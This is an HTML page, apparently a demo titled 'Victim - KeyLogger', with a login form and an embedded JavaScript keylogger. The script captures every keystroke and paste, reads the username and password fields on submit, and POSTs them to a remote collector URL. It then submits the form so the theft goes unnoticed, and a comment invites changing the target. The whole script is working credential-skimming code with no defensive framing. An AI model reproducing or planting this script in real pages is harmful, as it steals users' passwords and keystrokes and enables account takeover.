<html lang="eng">
<head>
    <title>Victim - KeyLogger</title>
</head>
<body>
    <form id="login-form" method="post" action="login.php" >
        <table border="0.5" >
            <tr>
                <td><label for="user_id">User Name</label></td>
                <td><input type="text" name="user_id" id="user_id"/></td>
            </tr>
            <tr>
                <td><label for="user_pass">Password</label></td>
                <td><input type="password" name="user_pass" id="user_pass"/></td>
            </tr>
            <tr>
                <td><input type="submit" value="Submit" /></td>
                <td><input type="reset" value="Reset"/></td>
            </tr>
        </table>
    </form>
    <script>
        //declare global variables (change depending on target)
        const login_form = document.querySelector('#login-form');
        const remote = 'http://127.0.0.1:8081/keylogger.php';

        // add the key press to the collection of all strokes
        let presses = [];

        //add log to collection
        let log = function(string) {
            // log the current date and time of the interaction
            let current = {
                t: Math.round((new Date()).getTime() / 1000),
                k: string
            };
            // add the string to the collection of all strokes
            presses.push(current);
        };

        // reusable POST function to send data to remote target
        let POST = function(url, params) {
            let http = new XMLHttpRequest();
            http.open('POST', url, true);
            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            http.send(params);
        };

        // start logging after the page has loaded
        document.addEventListener("DOMContentLoaded", function(){
            // add event listener to the window to collect any keydown interactions with the page
            window.addEventListener('keydown', function(event) {
                log(event.key);
            });
            // intercept any pasting into the available inputs to account for a vault
            document.addEventListener('paste', function(event) {
                let clipboardData = event.clipboardData || window.clipboardData;
                log(clipboardData.getData('Text'))
            });
            // once the targeted form is submitted retrieve all inputs (some may have been pre-filled)
            login_form.addEventListener('submit', function(event) {
                event.preventDefault();
                // acquire form data and add to exfiltrated data
                let inputs = login_form.querySelectorAll('input');
                let j;
                for (j in inputs) {
                    if (inputs[j].id !== undefined) {
                        log(['(', inputs[j].id, ':', inputs[j].value, ')'].join(''));
                    }
                }
                // acquire all keystrokes
                let logs = ['keys='];
                let i;
                for (i in presses) {
                    logs.push(presses[i].k);
                    logs.push(',')
                }
                logs.push('&datetime=');
                logs.push(presses[presses.length - 1].t);

                POST(remote, logs.join(''));
                // wait to let logs get to server
                setTimeout(function() {
                    login_form.removeEventListener('submit', this);
                    login_form.submit();
                }, 1000)
            });
        });
    </script>
</body>
</html>
